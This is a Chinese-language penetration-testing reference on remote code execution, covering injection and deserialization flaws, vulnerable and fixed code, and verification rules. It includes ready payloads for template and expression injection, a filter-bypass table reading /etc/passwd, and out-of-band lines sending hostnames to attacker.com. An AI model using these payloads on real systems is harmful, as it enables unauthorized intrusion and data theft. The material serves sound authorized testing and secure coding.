# 远程代码执行原理与测试技术

## 漏洞原理
远程代码执行 (Remote Code Execution, RCE) 是最危险的 Web 漏洞类型之一，攻击者可以在目标服务器上执行任意代码。RCE 不是一个单一的漏洞，而是多种底层漏洞的最终表现形式。

核心机制：
- **用户输入被当作代码/命令执行**：应用程序将用户可控的数据传递给代码解释器、命令执行器或序列化/反序列化引擎
- **执行上下文不受限**：执行的代码继承应用进程的权限
- **缺乏输入验证与沙箱**：未对用户输入进行过滤、转义或在受限环境中执行

## 漏洞类型与变种

### 1. 命令注入 (Command Injection)
用户输入被直接拼接到系统命令中执行。

**类型**：
- **直接注入**：`system("ping " + userInput)`
- **间接注入**：通过环境变量、文件名、URL 参数间接传递到命令
- **盲注**：命令执行结果不回显，需通过延时或 OOB 验证

**常用分隔符**：
| 分隔符 | 平台 | 示例 |
|--------|------|------|
| `;` | Unix/Windows | `cmd1; cmd2` |
| `\|` | Unix/Windows | `cmd1 \| cmd2`（管道） |
| `\|\|` | Unix/Windows | `cmd1 \|\| cmd2`（前一个失败时执行） |
| `&&` | Unix/Windows | `cmd1 && cmd2`（前一个成功时执行） |
| `&` | Windows | `cmd1 & cmd2`（后台执行） |
| `` `cmd` `` | Unix | 命令替换 |
| `$(cmd)` | Unix | 命令替换 |

### 2. 代码注入 (Code Injection)
用户输入被直接作为编程语言代码执行。

**常见场景**：
- `eval()` / `exec()` 执行用户输入
- 动态 `include`/`require` 用户控制的文件
- `setTimeout()` / `setInterval()` 接受字符串代码
- 模板引擎中的代码执行

### 3. 反序列化漏洞 (Deserialization)
不安全的反序列化导致构造的恶意对象在反序列化过程中执行代码。

**Java 反序列化**：
- `ObjectInputStream.readObject()` 反序列化攻击者控制的字节流
- 利用 Gadget Chain（如 CommonsCollections, Spring AOP）触发代码执行
- JSON 反序列化（Jackson, Fastjson）中的 autoType 特性

**PHP 反序列化**：
- `unserialize()` 处理用户输入，通过魔术方法（`__wakeup`, `__destruct`）触发
- Phar 反序列化：通过 `phar://` 协议触发反序列化

**Python 反序列化**：
- `pickle.loads()`, `yaml.load()`（非 SafeLoader）, `marshal`

**.NET 反序列化**：
- `BinaryFormatter`, `NetDataContractSerializer`
- `ObjectDataProvider` (XAML), `ActivitySurrogateSelector`

### 4. 模板注入 (Template Injection)
**服务端模板注入 (SSTI)**：
- Jinja2 (Python): `{{ config }}`, `{{ self.__dict__ }}`, `{{ cycler.__init__.__globals__ }}`
- Thymeleaf (Java): `__${T(java.lang.Runtime).getRuntime().exec('cmd')}__`
- Freemarker (Java): `<#assign ex="freemarker.template.utility.Execute"?new()>${ex('cmd')}`
- Twig (PHP): `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
- EJS (Node.js): `<%- global.process.mainModule.require('child_process').execSync('id') %>`

**客户端模板注入**：
- AngularJS 沙箱绕过 (v1.x)
- Vue/React 中的 `v-html` / `dangerouslySetInnerHTML`

### 5. 表达式注入 (Expression Injection)
- **SpEL (Spring Expression Language)**: `#{T(java.lang.Runtime).getRuntime().exec('cmd')}`
- **OGNL (Struts2)**: `${(@java.lang.Runtime@getRuntime().exec('cmd'))}`
- **MVEL**: `Runtime.getRuntime().exec("cmd")`
- **EL (JSP Expression Language)**: `${"".getClass().forName("java.lang.Runtime")}`

### 6. LDAP 注入
```
LDAP: (&(user=admin)(password=*)) → (&(user=admin)(password=*)(&(=)))
注入: *)(objectClass=*)) → 绕过认证
```

## 检测方法

### 命令注入检测
1. **基本探测**：注入 `; sleep 5` 或 `| sleep 5` 观察延迟
2. **回显命令**：注入 `; id` 或 `; whoami` 观察响应中是否包含执行结果
3. **布尔探测**：注入 `&& true` vs `&& false` 观察响应差异
4. **OOB 验证**：使用 `curl http://attacker.com/` 或 DNS 解析带外验证

### 反序列化检测
1. **识别序列化格式**：
   - Java: 字节流以 `AC ED 00 05` 开头（Base64 为 `rO0AB`）
   - PHP: `O:4:"User":...` 格式
   - Python pickle: `\x80\x04\x95...`
2. **寻找反序列化入口**：Cookie、Hidden 字段、HTTP Header、API 参数
3. **Gadget 探测**：注入已知 gadget chain 的 payload 观察响应

### 模板注入检测
1. **数学表达式**：注入 `{{7*7}}` 或 `${7*7}` 观察是否计算为 `49`
2. **基础对象探测**：注入 `{{self}}`, `{{config}}` 观察回显
3. **错误信息**：注入非法模板语法观察错误堆栈

### 表达式注入检测
1. **SpEL**：注入 `#{7*7}` 观察是否解析
2. **OGNL**：注入 `${7*7}` 观察 Struts2 解析
3. **EL**：注入 `${1+1}` 观察 JSP EL 解析

## 常见脆弱模式

### 命令注入
```java
// 危险：Runtime.exec 直接拼接
Process p = Runtime.getRuntime().exec("ping -c 4 " + userInput);

// 危险：ProcessBuilder 数组中拼接
ProcessBuilder pb = new ProcessBuilder("sh", "-c", "ping " + userInput);

// 危险：Apache Commons Exec
CommandLine cmdLine = CommandLine.parse("ping " + userInput);

// 安全：参数化执行（不使用 shell）
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", userInput);
// 注意：仍需要验证 userInput 是合法 IP/域名
```

```python
# 危险：os.system / subprocess shell=True
os.system("ping -c 4 " + user_input)
subprocess.run(f"ping -c 4 {user_input}", shell=True)

# 安全：参数化列表
subprocess.run(["ping", "-c", "4", user_input], shell=False)
```

```php
// 危险
system("ping -c 4 " . $_GET['host']);
exec($_POST['cmd']);
passthru("nslookup " . $domain);

// 安全：escapeshellcmd / escapeshellarg
system("ping -c 4 " . escapeshellarg($host));
```

### 反序列化
```java
// 危险：直接反序列化用户输入
ObjectInputStream ois = new ObjectInputStream(
    new ByteArrayInputStream(Base64.getDecoder().decode(userInput)));
Object obj = ois.readObject();

// 安全：使用 ObjectInputFilter (Java 9+)
ois.setObjectInputFilter(ObjectInputFilter.Config.createFilter("java.base/java.lang.*"));

// 安全：使用安全的序列化库（如 JSON 替代 Java 原生序列化）
```

```python
# 危险
import pickle
data = pickle.loads(base64.b64decode(user_input))

# 安全：使用 json 替代
import json
data = json.loads(user_input)

# 危险：yaml.load 非安全模式
import yaml
data = yaml.load(user_input)  # 旧版本可执行 Python 代码

# 安全
data = yaml.safe_load(user_input)
```

### 模板注入
```python
# 危险：Jinja2 render_template_string 使用用户输入
from jinja2 import Template
template = Template(user_input)  # 用户控制模板
return template.render()

# 安全：使用模板文件，用户输入仅作为数据
return render_template("template.html", data=user_input)

# 危险：格式化字符串注入
message = "Hello " + user_name  # 如果后续用于 .format()
formatted = message.format(secret=value)
```

```java
// 危险：Thymeleaf 用户控制模板
public String render(@RequestParam String template) {
    Context ctx = new Context();
    return templateEngine.process(template, ctx); // 用户控制模板名
}

// 安全：白名单模板
private static final Set<String> ALLOWED = Set.of("home", "about", "contact");
if (!ALLOWED.contains(template)) throw new SecurityException();
```

## 绕过技巧

### 命令注入绕过
| 技术 | 示例 | 说明 |
|------|------|------|
| 引号闭合 | `";id` / `'&&id` | 闭合前后命令的引号 |
| 反斜杠绕过 | `c\at /etc/passwd` | 绕过命令关键字过滤 |
| 变量拼接 | `A=c;B=at;$A$B /etc/passwd` | 命令拆分绕过 |
| Base64 解码执行 | `echo "Y2F0IC9ldGMvcGFzc3dk" \| base64 -d \| bash` | 绕过关键字检测 |
| 通配符 | `/b?n/c?t /e??/p??s?d` | 绕过命令路径检测 |
| 十六进制转义 | `$'\x63\x61\x74' /etc/passwd` | Bash 转义绕过 |
| 内联注释 | `cat$u /etc/passwd` | 利用未定义变量为空 |
| 子命令编码 | `$(printf '\154\163')` | 八进制编码命令 |

### 反序列化绕过
- **Gadget Chain 变种**：利用不同的 gadget 组合绕过黑名单
- **JSON 反序列化**：Fastjson autoType 绕过（`@type`, `@type` 嵌套）
- **PHP Phar**：通过图片 EXIF、ZIP 等容器隐藏 Phar 文件
- **类白名单绕过**：利用白名单中的类作为跳板

### 模板注入绕过
| 引擎 | 绕过技术 |
|------|---------|
| Jinja2 | 使用 `request.application.__globals__` 替代直接访问 `__builtins__` |
| Jinja2 | 利用 `url_for.__globals__`, `get_flashed_messages.__globals__` |
| Thymeleaf | `__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}__` |
| Freemarker | 使用 `<#assign>` 定义变量间接调用 |

## 验证策略

### POC 生成建议
1. **无害命令优先**：使用 `id`, `whoami`, `hostname`, `uname -a`, `sleep 3`
2. **带外验证 (OOB)**：使用 DNS/HTTP 请求到可控服务器确认执行
   - DNS: `nslookup $(whoami).attacker.com`
   - HTTP: `curl http://attacker.com/$(hostname)`
3. **延时验证**：`sleep 5` 或 `ping -c 5 127.0.0.1`（适用于盲注）
4. **模板注入检测**：先使用 `{{7*7}}` 等数学表达式确认注入点

### 验证成功标志
- 响应中包含 `uid=`, `gid=`（`id` 命令输出）
- 响应中包含主机名（`hostname` 输出）
- 响应时间出现预期延迟（`sleep` 命令）
- 收到带外 DNS/HTTP 请求

### 常见 Gadget Chain（反序列化 POC）
- **Java CommonsCollections**: `InvokerTransformer` → `ChainedTransformer` → `TransformedMap`
- **Java Spring AOP**: `JdkDynamicAopProxy` → `AdvisedSupport` → `TargetSource`
- **Fastjson**: `@type: com.sun.rowset.JdbcRowSetImpl` → JNDI 注入
- **PHP**: `Monolog\Handler\SyslogHandler` → 文件写 / 命令执行

## 安全注意事项

### POC 执行安全边界（极其重要）
- **禁止**：执行破坏性命令（`rm -rf`, `DROP DATABASE`, 关机/重启）
- **禁止**：下载或执行外部恶意脚本
- **禁止**：反弹 shell 或建立持久化后门
- **禁止**：横向移动到内网其他主机
- **推荐**：仅使用 `id`, `whoami`, `hostname`, `sleep N` 等无害命令
- **推荐**：OOB 验证时使用 DNS 查询（比 HTTP 请求更轻量）
- **推荐**：记录所有执行的命令和时间戳

### 测试环境要求
- 优先在隔离的测试环境执行 RCE 验证
- 对生产系统的验证应仅限非破坏性命令
- 确保已获得明确的渗透测试授权
- 控制命令执行频率，避免影响服务可用性
